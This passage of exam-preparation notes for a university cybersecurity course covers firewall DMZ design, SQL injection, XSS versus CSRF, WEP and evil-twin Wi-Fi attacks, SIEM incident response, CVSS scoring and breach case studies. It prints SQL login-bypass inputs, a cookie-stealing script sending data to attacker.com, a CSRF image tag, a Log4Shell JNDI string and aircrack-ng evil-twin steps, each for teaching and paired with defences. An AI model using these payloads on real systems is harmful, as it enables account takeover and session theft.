+<p>1. <strong>Dual-Firewall vs Single-Firewall Architecture</strong>:</p>
+<p>   - In a single three-legged firewall, a single software vulnerability or misconfiguration compromises both the DMZ and the internal LAN simultaneously.</p>
+<p>   - In a <strong>Dual-Firewall architecture with heterogeneous vendors</strong> (e.g., Palo Alto externally, Fortinet internally), an exploit that compromises the external firewall will not work against the internal firewall, requiring the attacker to break through two entirely different operating systems and rule engines.</p>
+<p>2. <strong>Firewall Rule Philosophy</strong>:</p>
+<p>   - Traffic from Internet -> DMZ: Permitted strictly on required service ports (80, 443, 25, 53).</p>
+<p>   - Traffic from DMZ -> Internal LAN: <strong>DENIED by default</strong>. Only established, initiated queries from Internal LAN to DMZ are allowed.</p>
+<p>   - Traffic from Internal LAN -> Internet: Permitted via NAT / Web Proxy.</p>
+<p>3. <strong>IDS vs IPS Placement</strong>:</p>
+<p>   - <strong>IPS (Inline)</strong>: Deployed between External Firewall and DMZ. Active inspection; drops malicious packets (e.g. known SQLi/XSS signatures) before they reach servers.</p>
+<p>   - <strong>IDS (Out-of-Band via SPAN/Mirror Port)</strong>: Deployed in the internal trusted core network. Analyzes copied traffic without introducing network latency or risking false-positive service outages on internal critical transactions.</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 8: Web Security: SQL Injection Authentication Bypass (Unit 4)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"A developer writes a PHP login script with the following SQL query construction:  </p></blockquote>
+<blockquote><p>`$sql = \"SELECT * FROM users WHERE username = '\" . $_POST['user'] . \"' AND password = '\" . $_POST['pass'] . \"';\";`  </p></blockquote>
+<blockquote><p>1. An attacker inputs `admin' -- ` into the username field. Show the resulting query executed by the database engine and explain why authentication succeeds without a password.  </p></blockquote>
+<blockquote><p>2. Show the exact query when an attacker inputs `' OR '1'='1' -- `.  </p></blockquote>
+<blockquote><p>3. Write the secure, corrected code utilizing Parameterized Prepared Statements in Python or PHP."*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Vulnerability Classification</h4>
+<p>1. <strong>Vulnerability</strong>: <strong>CWE-89: SQL Injection (SQLi)</strong> - OWASP Top 10 A03:2021 / A05:2025 Injection.</p>
+<p>2. <strong>Root Cause</strong>: Unsafe concatenation of untrusted user input directly into executable SQL command strings, blurring the boundary between <strong>program code</strong> and <strong>user data</strong>.</p>
+<br>
+<h4>Tier 2: Attack Mechanics & Query Transformation</h4>
+<p>* <strong>Attack Case 1: Targeted Admin Bypass (<code>admin' -- </code>)</strong>:</p>
+<p>  - Input: <code>$_POST['user'] = admin' -- </code></p>
+<p>  - Executed Query:</p>
+<p>    <code></code>`sql</p>
+<p>    SELECT * FROM users WHERE username = 'admin' -- ' AND password = '...';</p>
+<p>    <code></code>`</p>
+<p>  - <em>Engine Logic</em>: The single quote <code>'</code> closes the username literal. The <code>-- </code> (SQL comment delimiter) tells the database engine to ignore everything following it. The password verification check is completely commented out. The database returns the record for <code>admin</code>, and the application logs the attacker in as administrator.</p>
+<br>
+<p>* <strong>Attack Case 2: Tautology Universal Bypass (<code>' OR '1'='1' -- </code>)</strong>:</p>
+<p>  - Input: <code>$_POST['user'] = ' OR '1'='1' -- </code></p>
+<p>  - Executed Query:</p>
+<p>    <code></code>`sql</p>
+<p>    SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = '...';</p>
+<p>    <code></code>`</p>
+<p>  - <em>Engine Logic</em>: The <code>WHERE</code> clause evaluates <code>username = ''</code> (FALSE) <code>OR '1'='1'</code> (ALWAYS TRUE). Since <code>FALSE OR TRUE</code> evaluates to <code>TRUE</code>, the <code>WHERE</code> condition matches every record in the table. The query returns the first user in the table (typically UID 1 / Superadmin).</p>
+<br>
+<h4>Tier 3: Secure Remediation (Parameterized Prepared Statements)</h4>
+<br>
+<p>* <strong>Why Parameterized Queries Fix SQLi Structurally</strong>:</p>
+<p>  - The database compiles the SQL query structure (<code>SELECT ... WHERE username = ? AND password = ?</code>) <strong>first</strong> into an execution tree.</p>
+<p>  - The user input is transmitted in a separate protocol phase as purely literal parameter data.</p>
+<p>  - Even if the input contains quotes, semicolons, or comments, the database engine treats them strictly as literal character data, never as executable SQL instructions.</p>
+<br>
+<p>* <strong>Corrected Secure Code (PHP PDO)</strong>:</p>
+<p>  <code></code>`php</p>
+<p>  // SECURE: Parameterized Prepared Statement using PDO</p>
+<p>  $stmt = $pdo->prepare('SELECT id, password_hash FROM users WHERE username = :username');</p>
+<p>  $stmt->execute(['username' => $_POST['user']]);</p>
+<p>  $user = $stmt->fetch();</p>
+<br>
+<p>  // Securely verify slow salted password hash (bcrypt/Argon2)</p>
+<p>  if ($user && password_verify($_POST['pass'], $user['password_hash'])) {</p>
+<p>      $_SESSION['authenticated'] = true;</p>
+<p>      $_SESSION['uid'] = $user['id'];</p>
+<p>  } else {</p>
+<p>      echo "Invalid credentials.";</p>
+<p>  }</p>
+<p>  <code></code>`</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 9: Cross-Site Scripting (XSS) vs CSRF Attacks (Unit 4)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"A commercial website suffers two security incidents in the same month:  </p></blockquote>
+<blockquote><p>Incident A: A user views a product review containing a malicious comment. Without clicking anything, the user's session cookie is transmitted to an external attacker server.  </p></blockquote>
+<blockquote><p>Incident B: A logged-in user visits an external blog site, and an image tag `<img src='http://bank.com/transfer?to=attacker&amt=5000'>` silently transfers money from their bank account.  </p></blockquote>
+<blockquote><p>1. Differentiate between Incident A (Stored XSS) and Incident B (CSRF).  </p></blockquote>
+<blockquote><p>2. Explain the execution context and victim browser behavior in each.  </p></blockquote>
+<blockquote><p>3. Provide the precise technical defenses required to eliminate each vulnerability."*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Vulnerability Distinction</h4>
+<br>
+<div class="avoid-break"><table>
+<thead><tr><th>Dimension</th><th>Incident A: Stored Cross-Site Scripting (XSS)</th><th>Incident B: Cross-Site Request Forgery (CSRF)</th></tr></thead>
+<tbody>
+<tr><td>**Vulnerability**</td><td>CWE-79: Cross-Site Scripting</td><td>CWE-352: Cross-Site Request Forgery</td></tr>
+<tr><td>**Root Cause**</td><td>Web app fails to sanitize/encode untrusted input before rendering it in browser DOM</td><td>Web app relies entirely on automatic browser cookie transmission without per-request validation</td></tr>
+<tr><td>**Code Execution**</td><td>Attacker executes arbitrary JavaScript inside victim's origin</td><td>Attacker **cannot** execute script or read responses; only forces state-changing requests</td></tr>
+<tr><td>**Confidentiality Impact**</td><td>**Severe**: Can steal session tokens, passwords, keystrokes, DOM content</td><td>**None directly**: Attacker cannot read response due to Same-Origin Policy (SOP)</td></tr>
+<tr><td>**Integrity Impact**</td><td>Severe (can modify page, trigger arbitrary actions)</td><td>High (executes unintended transactions)</td></tr>
+</tbody></table></div>
+<br>
+<h4>Tier 2: Attack Flow Breakdown</h4>
+<p>* <strong>Incident A (Stored XSS Flow)</strong>:</p>
+<p>  1. Attacker posts product review: <code><script>new Image().src='http://attacker.com/steal?c='+document.cookie;</script></code>.</p>
+<p>  2. Server stores payload into reviews database.</p>
+<p>  3. Victim visits product page. Server renders comment into HTML without output encoding.</p>
+<p>  4. Victim's browser parses <code><script></code> tag as legitimate code running under the website's trusted domain.</p>
+<p>  5. Script reads <code>document.cookie</code> and transmits the session token to attacker server.</p>
+<p>* <strong>Incident B (CSRF Flow)</strong>:</p>
+<p>  1. Victim logs into <code>bank.com</code>; session cookie stored in browser.</p>
+<p>  2. Without logging out, victim visits malicious site <code>evil.com</code>.</p>
+<p>  3. <code>evil.com</code> contains <code><img src='http://bank.com/transfer?to=attacker&amt=5000'></code>.</p>
+<p>  4. Victim's browser fetches image URL. Because destination is <code>bank.com</code>, browser <strong>automatically attaches victim's valid session cookie</strong>.</p>
+<p>  5. Bank server verifies valid cookie and executes transfer of $5,000.</p>
+<br>
+<h4>Tier 3: Technical Mitigation Matrix</h4>
+<p>1. <strong>Defenses Against XSS (Incident A)</strong>:</p>
+<p>   - <strong>Contextual Output Encoding</strong>: Encode all user data before rendering (HTML entity encoding: <code><</code> -> <code>&lt;</code>, <code>"</code> -> <code>&quot;</code>).</p>
+<p>   - <strong>HttpOnly Cookie Flag</strong>: Set <code>Set-Cookie: sessionid=xyz; Secure; HttpOnly; SameSite=Strict</code>. Prevents JavaScript from reading <code>document.cookie</code>.</p>
+<p>   - <strong>Content Security Policy (CSP)</strong>: HTTP Header: <code>Content-Security-Policy: default-src 'self'; script-src 'self';</code> (blocks inline scripts and unauthorized external domains).</p>
+<p>2. <strong>Defenses Against CSRF (Incident B)</strong>:</p>
+<p>   - <strong>Anti-CSRF Synchronizer Tokens</strong>: Embed unique, cryptographically random, unpredictable token in every form (<code><input type='hidden' name='csrf_token' value='...'></code>). Server validates token matches session token. Malicious sites cannot read or forge this token.</p>
+<p>   - <strong>SameSite Cookie Attribute</strong>: Set <code>SameSite=Strict</code> (browser never sends cookie on cross-site requests) or <code>SameSite=Lax</code> (cookie sent only on top-level GET navigations).</p>
+<p>   - <strong>Re-Authentication</strong>: Require password or OTP re-entry for high-risk operations (password change, fund transfer).</p>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 10: Wireless Security Flaws & Evil Twin Attacks (Unit 4)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"A financial consultancy has two wireless issues:  </p></blockquote>
+<blockquote><p>Issue 1: An auditor cracks the company's legacy WEP-encrypted warehouse Wi-Fi network in under 4 minutes by capturing 40,000 packets.  </p></blockquote>
+<blockquote><p>Issue 2: Consultants working in an airport lounge connect to a rogue Wi-Fi network named 'Airport_Free_WiFi' that clones the legitimate airport hotspot, presenting a captive portal harvesting credentials.  </p></blockquote>
+<blockquote><p>1. Explain the mathematical and protocol failure of WEP that enables cracking in minutes.  </p></blockquote>
+<blockquote><p>2. Explain how an Evil Twin / Rogue AP attack works.  </p></blockquote>
+<blockquote><p>3. Contrast WPA2 AES-CCMP with WPA3 SAE (Dragonfly handshake) with respect to offline dictionary attacks."*</p></blockquote>
+<br>
+<h4>Tier 1: Concept & Protocol Evolution</h4>
+<p>* <strong>WEP (Wired Equivalent Privacy)</strong>: Legacy 802.11 standard using RC4 stream cipher.</p>
+<p>* <strong>Evil Twin</strong>: Rogue wireless access point masquerading as a legitimate AP by spoofing its SSID and MAC address (BSSID).</p>
+<p>* <strong>WPA3</strong>: Modern standard replacing Pre-Shared Key (PSK) with Simultaneous Authentication of Equals (SAE).</p>
+<br>
+<h4>Tier 2: Scenario Analysis</h4>
+<p>* <strong>Why WEP Cracks in Minutes (Issue 1)</strong>:</p>
+<p>  - WEP combines a shared key $K$ (40 or 104 bits) with a cleartext Initialization Vector (IV) of only <strong>24 bits</strong> to seed RC4: $\text{Seed} = \text{IV} \mathbin{\Vert} K$.</p>
+<p>  - With only 24 bits, there are only 2^24 approx 16.7 million possible IVs.</p>
+<p>  - By the Birthday Paradox, an IV repeats (collision) every approx 5,000 packets on an active network.</p>
+<p>  - Certain "weak IVs" reveal mathematical information about individual key bytes in the first few bytes of RC4 pseudorandom keystream output (Fluhrer, Mantin, and Shamir - <strong>FMS attack</strong>).</p>
+<p>  - Tools like <code>aircrack-ng</code> collect ARP request packets (which have known cleartext headers), harvest weak IVs, and mathematically reconstruct the WEP key in 3-5 minutes without guessing.</p>
+<br>
+<p>* <strong>Evil Twin Mechanics (Issue 2)</strong>:</p>
+<p>  1. Attacker scans wireless environment using <code>airodump-ng</code> to find legitimate SSID (<code>Airport_Free_WiFi</code>, Channel 6, BSSID <code>00:11:22:33:44:55</code>).</p>
+<p>  2. Attacker configures rogue software AP (<code>airbase-ng</code>) with identical SSID on a different channel (Channel 11) with higher transmit power (+20 dBm).</p>
+<p>  3. Attacker sends 802.11 Deauthentication management frames (<code>aireplay-ng -0</code>) to disconnect clients from the legitimate AP.</p>
+<p>  4. Client devices automatically reconnect to the strongest signal--the Evil Twin AP.</p>
+<p>  5. Attacker runs DNS server redirecting all HTTP requests to a fake captive portal login page harvesting user credentials.</p>
+<br>
+<h4>Tier 3: WPA2 vs WPA3 Protocol Comparison</h4>
+<br>
+<div class="avoid-break"><table>
+<thead><tr><th>Feature</th><th>WPA2 (Pre-Shared Key - PSK)</th><th>WPA3 (Simultaneous Authentication of Equals - SAE)</th></tr></thead>
+<tbody>
+<tr><td>**Underlying Standard**</td><td>IEEE 802.11i</td><td>Wi-Fi Alliance WPA3 Specification</td></tr>
+<tr><td>**Cipher Suite**</td><td>AES-128 in CCMP mode</td><td>AES-GCM (128-bit) / CNSA Suite (192-bit)</td></tr>
+<tr><td>**Handshake Protocol**</td><td>4-Way Handshake (`ANonce`, `SNonce`, `MIC`)</td><td>**Dragonfly Handshake (SAE)** based on zero-knowledge proof</td></tr>
+<tr><td>**Offline Dictionary Cracking**</td><td>**VULNERABLE**: Attacker captures 4-way handshake, computes PMK offline without touching AP</td><td>**IMMUNE**: SAE prevents offline dictionary attacks; each guess requires interactive live handshake</td></tr>
+<tr><td>**Forward Secrecy**</td><td>**NO**: If pre-shared key is cracked later, all past recorded traffic can be decrypted</td><td>**YES**: Ephemeral Diffie-Hellman keys ensure past traffic remains secret even if passphrase leaked</td></tr>
+<tr><td>**Enterprise Auth**</td><td>802.1X EAP-TLS / PEAP</td><td>192-bit Security Mode with EAP-TLS & Suite B algorithms</td></tr>
+</tbody></table></div>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 11: Enterprise Incident Response & SIEM Log Correlation (Unit 5)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"At 02:15 AM on a Saturday, an enterprise SIEM generates a high-severity alert:  </p></blockquote>
+<blockquote><p>- Windows Domain Controller logs Event ID 4625 (Failed Logon) 450 times in 3 minutes for user `svc-backup`.  </p></blockquote>
+<blockquote><p>- Followed immediately by Event ID 4624 (Successful Logon, Logon Type 3 - Network).  </p></blockquote>
+<blockquote><p>- Followed by Event ID 4720 (A user account was created: `admin-temp`).  </p></blockquote>
+<blockquote><p>- Firewall detects persistent outbound TCP connection from Domain Controller to external IP `198.51.100.88` on port 4444.  </p></blockquote>
+<blockquote><p>1. Analyze this sequence of events. What type of attack has occurred?  </p></blockquote>
+<blockquote><p>2. Outline the response using all 4 phases of the NIST SP 800-61 Incident Response Lifecycle.  </p></blockquote>
+<blockquote><p>3. State the significance of Windows Event IDs 4624, 4625, and 4720 in security auditing."*</p></blockquote>
+<br>
+<h4>Tier 1: Incident Analysis & Event Correlation</h4>
+<p>1. <strong>Attack Type</strong>: <strong>Automated Password Brute-Force / Spraying</strong> followed by <strong>Compromised Service Account Login</strong>, <strong>Privilege Escalation / Persistence Creation</strong>, and <strong>Metasploit Reverse TCP Meterpreter Shell (C2)</strong> on default port 4444.</p>
+<p>2. <strong>Severity</strong>: <strong>Critical (P1)</strong> - Full domain compromise in progress.</p>
+<br>
+<h4>Tier 2: NIST SP 800-61 Incident Response Execution</h4>
+<br>
+<div class="avoid-break"><pre><code>[ Phase 1: PREPARATION ]
+- Pre-established Incident Response Team (CIRT), jump kits, SIEM baselines, offline communication channels.
+                                |
+                                v
+[ Phase 2: DETECTION &amp; ANALYSIS ]
+- Correlate SIEM events: 450x Event 4625 (Brute Force) -&gt; 1x Event 4624 (Compromise) -&gt; Event 4720 (Backdoor Account).
+- Triage outbound C2 beacon to 198.51.100.88:4444. Scope: Domain Controller compromised.
+                                |
+                                v
+[ Phase 3: CONTAINMENT, ERADICATION &amp; RECOVERY ]
+- Containment: Sever Domain Controller network connection (isolate switch port / null-route C2 IP).
+  DO NOT power off machine (preserve volatile RAM evidence for digital forensics).
+- Eradication: Terminate malicious process (PID bound to port 4444); delete rogue account `admin-temp`.
+  Revoke and reset Kerberos Ticket Granting Service (`krbtgt`) account passwords twice.
+- Recovery: Restore DC system state from verified pre-infection offline backup; patch initial entry vector.
+                                |
+                                v
+[ Phase 4: POST-INCIDENT ACTIVITY (LESSONS LEARNED) ]
+- Conduct retrospective review within 72 hours; document incident timeline and financial impact.
+- Improve controls: Enforce gMSA (Group Managed Service Accounts) with 128-character rotating passwords.</code></pre></div>
+<br>
+<h4>Tier 3: Critical Windows Event IDs in Auditing</h4>
+<br>
+<div class="avoid-break"><table>
+<thead><tr><th>Windows Event ID</th><th>Event Description</th><th>Security Audit Significance</th></tr></thead>
+<tbody>
+<tr><td>**Event ID 4624**</td><td>An account was successfully logged on</td><td>Verifies access; Logon Type 2 (Interactive/Console), Logon Type 3 (Network/SMB), Logon Type 10 (RDP)</td></tr>
+<tr><td>**Event ID 4625**</td><td>An account failed to log on</td><td>Primary telemetry for detecting Brute-Force, Dictionary, and Password Spraying attacks</td></tr>
+<tr><td>**Event ID 4720**</td><td>A user account was created</td><td>Critical indicator of attacker establishing persistence / rogue backdoor accounts</td></tr>
+<tr><td>**Event ID 4726**</td><td>A user account was deleted</td><td>Monitored to detect attackers cleaning tracks after exploitation</td></tr>
+<tr><td>**Event ID 4738**</td><td>A user account was modified</td><td>Monitored for privilege escalation (e.g. adding user to `Domain Admins`)</td></tr>
+</tbody></table></div>
+<br>
+<hr>
+<br>
+<div class="avoid-break"><h3>SCENARIO 12: CVSS v3.1 Vulnerability Scoring & VAPT Reporting (Unit 5)</h3>
+<br>
+<blockquote><p>**Exam Scenario**:  </p></blockquote>
+<blockquote><p>*"During a penetration test of a healthcare API, an ethical hacker discovers an unauthenticated SQL injection vulnerability in an externally facing endpoint `/api/patients/records`.  </p></blockquote>
+<blockquote><p>- The endpoint can be reached across the public Internet without valid user credentials.  </p></blockquote>
+<blockquote><p>- Exploiting it requires no specialized conditions or user interaction.  </p></blockquote>
+<blockquote><p>- A successful attack allows complete exfiltration of all confidential medical records, unauthorized database tampering, and total database shutdown.  </p></blockquote>
+<blockquote><p>1. Calculate the CVSS v3.1 Base Metrics and explain each metric assignment.  </p></blockquote>
+<blockquote><p>2. Determine the Qualitative Severity Rating Band (Low, Medium, High, Critical).  </p></blockquote>
+<blockquote><p>3. Contrast the Executive Summary with the Technical Findings section of a VAPT report."*</p></blockquote>
+<br>
+<h4>Tier 1: CVSS v3.1 Metric Framework & Rules</h4>
+<p>Common Vulnerability Scoring System (CVSS) v3.1 Base Metrics evaluate the intrinsic characteristics of a vulnerability that are constant over time and across user environments:</p>
+<p>- <strong>Exploitability Metrics</strong>: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI).</p>
+<p>- <strong>Scope Metric</strong>: Scope (S) - whether flaw impacts resources beyond its security authority.</p>
+<p>- <strong>Impact Metrics</strong>: Confidentiality (C), Integrity (I), Availability (A).</p>
+<br>
+<h4>Tier 2: Metric Assignment & Vector String</h4>
+<br>
+<div class="avoid-break"><pre><code>+---------------------------+-------------------+---------------------------------------------------+
+| Metric Dimension          | Assigned Value    | Technical Justification                          |
++---------------------------+-------------------+---------------------------------------------------+
+| Attack Vector (AV)        | Network (N)       | Vulnerable endpoint is exposed to public Internet |
+| Attack Complexity (AC)    | Low (L)           | No specialized access conditions or race conditions|
+| Privileges Required (PR)  | None (N)          | Unauthenticated endpoint; zero credentials needed |
+| User Interaction (UI)     | None (N)          | Exploits directly without requiring victim click  |
+| Scope (S)                 | Unchanged (U)     | Flaw directly impacts database within its scope   |
+| Confidentiality (C)       | High (H)          | Total exfiltration of patient medical history     |
+| Integrity (I)             | High (H)          | Attacker can modify/corrupt patient health records|
+| Availability (A)          | High (H)          | Attacker can DROP tables, causing total denial     |
++---------------------------+-------------------+---------------------------------------------------+</code></pre></div>
+<br>
+<p>* <strong>CVSS v3.1 Vector String</strong>:  </p>
+<p>  <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code></p>
+<p>* <strong>Score Calculation</strong>:  </p>
+<p>  - Base Score = <strong>9.8 / 10.0</strong></p>
+<p>* <strong>Qualitative Severity Band</strong>:</p>
+<p>  - <code>0.0</code>: None</p>
+<p>  - <code>0.1 - 3.9</code>: Low</p>
+<p>  - <code>4.0 - 6.9</code>: Medium</p>
+<p>  - <code>7.0 - 8.9</code>: High</p>
+<p>  - <strong><code>9.0 - 10.0</code>: CRITICAL</strong>  </p>
+<p>  <em>Result</em>: This vulnerability falls squarely in the <strong>CRITICAL</strong> severity band and requires immediate emergency patching within 24 hours.</p>
+<br>
+<h4>Tier 3: VAPT Report Structure Comparison</h4>
+<br>
+<div class="avoid-break"><table>
+<thead><tr><th>Section</th><th>Target Audience</th><th>Technical Depth</th><th>Primary Contents</th></tr></thead>
+<tbody>
+<tr><td>**Executive Summary**</td><td>C-Suite, Board, Non-technical Executives (CEO, CIO, CISO)</td><td>High-Level, Zero Jargon, Business-Impact Focused</td><td>Overall security posture score, business risk analysis, financial & legal liability exposure, high-level remediation roadmap</td></tr>
+<tr><td>**Technical Findings**</td><td>System Administrators, Software Developers, Security Engineers</td><td>Deep Technical Detail, Reproducible Proof-of-Concept</td><td>Exact URL/endpoint, CVSS score & vector, step-by-step reproduction steps, raw HTTP requests/responses, code snippets, specific patch guidance</td></tr>
+</tbody></table></div>
+<br>
+<hr>
+<br>
+<h2>Part 3: The 7 Real-World Case Studies (Extended Application Matrix)</h2>
+<br>
+<p><em>(Directly derived from the Course Seminar & Home Assignment List in the Syllabus)</em></p>
+<br>
+<div class="avoid-break"><h3>1. WannaCry Ransomware (2017)</h3>
+<p>* <strong>Incident Summary</strong>: In May 2017, the WannaCry cryptoworm infected 200,000+ computers across 150 countries within hours, severely crippling the UK National Health Service (NHS).</p>
+<p>* <strong>Technical Root Cause</strong>: Exploited <code>EternalBlue</code> (<code>CVE-2017-0144</code> / <code>MS17-010</code>) in Microsoft's legacy SMBv1 protocol over TCP port 445. Allowed unauthenticated remote code execution at <code>SYSTEM</code> level.</p>
+<p>* <strong>Propagation</strong>: Combined exploit with <code>DoublePulsar</code> backdoor to self-propagate across internal subnets without any human interaction.</p>
+<p>* <strong>Stop Mechanism</strong>: Security researcher Marcus Hutchins discovered an unregistered domain in the code and registered it for $10.69, activating a hardcoded kill switch.</p>
+<p>* <strong>Exam Prevention Lessons</strong>:</p>
+<p>  1. Patch Management: Microsoft had released patch <code>MS17-010</code> two months earlier; infected machines had neglected updates.</p>
+<p>  2. Protocol Hardening: Decommission legacy protocols (disable SMBv1).</p>
+<p>  3. Perimeter Defense: Block TCP port 445 at edge firewalls.</p>
+<br>
+<div class="avoid-break"><h3>2. Equifax Data Breach (2017)</h3>
+<p>* <strong>Incident Summary</strong>: Attackers breached Equifax, one of the three largest credit bureaus in the US, compromising sensitive PII (Social Security numbers, birth dates, driver's licenses) of 147 million consumers.</p>
+<p>* <strong>Technical Root Cause</strong>: Unpatched vulnerability in <strong>Apache Struts</strong> web framework (<code>CVE-2017-5638</code>). Improper handling of untrusted data in the <code>Content-Type</code> HTTP header allowed remote code execution via OGNL expressions.</p>
+<p>* <strong>Post-Exploitation</strong>: Attackers maintained access for 76 days, moving laterally across unsegmented subnets and querying internal unencrypted databases.</p>
+<p>* <strong>Exam Prevention Lessons</strong>:</p>
+<p>  1. Vulnerability Management: Maintain an accurate Software Bill of Materials (SBOM) and patch known vulnerabilities within designated SLAs.</p>
+<p>  2. Network Segmentation: Separate web-tier DMZ from database-tier networks.</p>
+<p>  3. Encryption at Rest & in Transit: Encrypt sensitive data inside internal database stores.</p>
+<br>
+<div class="avoid-break"><h3>3. SolarWinds Supply Chain Attack (2020)</h3>
+<p>* <strong>Incident Summary</strong>: Russian state-sponsored threat group APT29 (Cozy Bear) compromised SolarWinds' software build pipeline, trojanizing updates of their widely used <strong>Orion IT management software</strong>.</p>
+<p>* <strong>Technical Root Cause</strong>: <strong>Software Supply Chain Compromise</strong>. Attackers gained access to SolarWinds' internal build environment and injected a backdoor dubbed <code>SUNBURST</code> into the source code of <code>SolarWinds.Orion.Core.BusinessLayer.dll</code>.</p>
+<p>* <strong>Delivery</strong>: The trojanized DLL was cryptographically signed with SolarWinds' legitimate digital certificate and distributed via official automatic software updates to 18,000+ government and enterprise customers.</p>
+<p>* <strong>Exam Prevention Lessons</strong>:</p>
+<p>  1. Secure Software Development Lifecycle (SSDLC): Implement reproducible, isolated build pipelines with multi-party code signing.</p>
+<p>  2. Zero-Trust Architecture: Even internally trusted, vendor-signed enterprise software must be subject to network egress filtering and behavioral monitoring.</p>
+<p>  3. Continuous Monitoring: Monitor for unusual outbound DNS queries and HTTP C2 beaconing.</p>
+<br>
+<div class="avoid-break"><h3>4. Colonial Pipeline Ransomware (2021)</h3>
+<p>* <strong>Incident Summary</strong>: In May 2021, DarkSide ransomware gang attacked Colonial Pipeline, forcing the temporary shutdown of the entire 5,500-mile fuel pipeline supplying 45% of the US East Coast's petroleum.</p>
+<p>* <strong>Technical Root Cause</strong>: A single compromised legacy Virtual Private Network (VPN) account password discovered inside a dark-web credential leak.</p>
+<p>* <strong>Critical Security Failure</strong>: The legacy VPN account <strong>did not have Multi-Factor Authentication (MFA)</strong> enabled and was an active orphaned account of an employee who no longer required it.</p>
+<p>* <strong>Exam Prevention Lessons</strong>:</p>
+<p>  1. Mandatory Multi-Factor Authentication (MFA): Require phishing-resistant MFA (FIDO2 / TOTP) across 100% of external remote access endpoints.</p>
+<p>  2. Account Lifecycle Management: Promptly de-provision and audit unused or legacy service accounts.</p>
+<p>  3. Dark Web Credential Monitoring: Monitor enterprise domain exposure in public credential dumps.</p>
+<br>
+<div class="avoid-break"><h3>5. MOVEit Transfer Vulnerability (2023)</h3>
+<p>* <strong>Incident Summary</strong>: The CL0P ransomware group exploited a zero-day vulnerability in Progress Software's MOVEit Transfer managed file transfer application, compromising data from over 2,000 organizations and 60 million individuals.</p>
+<p>* <strong>Technical Root Cause</strong>: Unauthenticated SQL Injection (<code>CVE-2023-34362</code>) in the web interface of MOVEit Transfer.</p>
+<p>* <strong>Exploitation</strong>: Attackers injected SQL payloads into HTTP request headers, bypassing authentication, executing arbitrary database commands, and dropping the <code>LEMURLOOT</code> web shell to exfiltrate massive volumes of stored customer files.</p>
+<p>* <strong>Exam Prevention Lessons</strong>:</p>
+<p>  1. Secure Code Auditing: Enforce strict parameterized SQL queries across all web interfaces.</p>
+<p>  2. Web Application Firewalls (WAF): Implement behavioral WAF rules to detect and block SQL injection patterns in HTTP headers.</p>
+<p>  3. Data Minimization: Avoid storing long-term sensitive files on Internet-facing transfer appliances.</p>
+<br>
+<div class="avoid-break"><h3>6. Log4Shell Vulnerability (2021)</h3>
+<p>* <strong>Incident Summary</strong>: A catastrophic zero-day vulnerability (<code>CVE-2021-44228</code>, CVSS 10.0 Critical) was discovered in Apache Log4j, an open-source Java logging library ubiquitous across enterprise software worldwide.</p>
+<p>* <strong>Technical Root Cause</strong>: JNDI (Java Naming and Directory Interface) Injection. Log4j parsed logged strings for format expressions like <code>${jndi:ldap://attacker.com/exploit}</code>.</p>
+<p>* <strong>Exploitation</strong>: An attacker simply submitted the malicious string in any logged field (e.g. HTTP User-Agent, login username, chat box). When Log4j wrote the log entry, it initiated an outbound LDAP connection to the attacker's server, downloaded a compiled Java class file, and executed arbitrary code at full application privilege.</p>
+<p>* <strong>Exam Prevention Lessons</strong>:</p>
+<p>  1. Safe Defaults: Disable remote lookup features by default (<code>log4j2.formatMsgNoLookups=true</code>).</p>
+<p>  2. Recursive Dependency Auditing: Maintain visibility into transitive dependencies using automated software composition analysis (SCA) tools.</p>
+<p>  3. Egress Traffic Filtering: Block arbitrary outbound LDAP (389), RMI (1099), and DNS traffic originating from server farms.</p>
+<br>
+<div class="avoid-break"><h3>7. Uber Data Breach (2022)</h3>
+<p>* <strong>Incident Summary</strong>: An 18-year-old hacker affiliated with Lapsus$ gained full administrative control over Uber's internal infrastructure, including Google Workspace, AWS console, Slack, and HackerOne admin portal.</p>
+<p>* <strong>Technical Root Cause</strong>: <strong>Social Engineering & MFA Fatigue (Push Bombing)</strong> combined with internal hardcoded secrets.</p>
+<p>* <strong>Exploitation Chain</strong>:</p>
+<p>  1. Attacker purchased an external contractor's corporate password on the dark web.</p>
+<p>  2. Attacker repeatedly sent Duo MFA push requests to the contractor's phone late at night while contacting them on WhatsApp pretending to be Uber IT support, coercing the contractor into approving the notification (MFA Fatigue).</p>
+<p>  3. Once connected to Uber's internal intranet, the attacker scanned network shares and found a PowerShell script containing hardcoded plaintext credentials for a Privileged Access Management (PAM) service (<code>Thycotic</code>).</p>
+<p>  4. The PAM master credentials granted administrative keys to all cloud and communication platforms.</p>
+<p>* <strong>Exam Prevention Lessons</strong>:</p>
+<p>  1. MFA Number Matching: Replace simple "Approve/Deny" push alerts with number matching (requiring user to enter numbers shown on the login screen).</p>
+<p>  2. Automated Secrets Scanning: Use tools (e.g. GitLeaks, TruffleHog) to prevent and alert on hardcoded credentials in scripts and source code.</p>
+<p>  3. Principle of Least Privilege: Segment administrative vaults and implement robust session auditing.</p>
+<br>
+<hr>
+<br>
+<h2>Part 4: Exam-Room Golden Rules for Scenario Questions</h2>
+<br>
+<p>1. <strong>Always State the CIA Impact</strong>:</p>
+<p>   In your opening sentence, classify whether the scenario violates <strong>Confidentiality</strong> (data exfiltration), <strong>Integrity</strong> (unauthorized data alteration), or <strong>Availability</strong> (DDoS/ransomware encryption).</p>
+<p>2. <strong>Never Say Just 'Use a Firewall'</strong>:</p>
+<p>   Specify the exact generation and configuration: <em>"Deploy a Stateful Next-Generation Firewall (NGFW) in a Dual-Firewall DMZ topology configured to drop ingress TCP port 445 and inspect Layer 7 HTTP payloads."</em></p>
+<p>3. <strong>Never Say Just 'Fix the Code' for SQLi/XSS</strong>:</p>
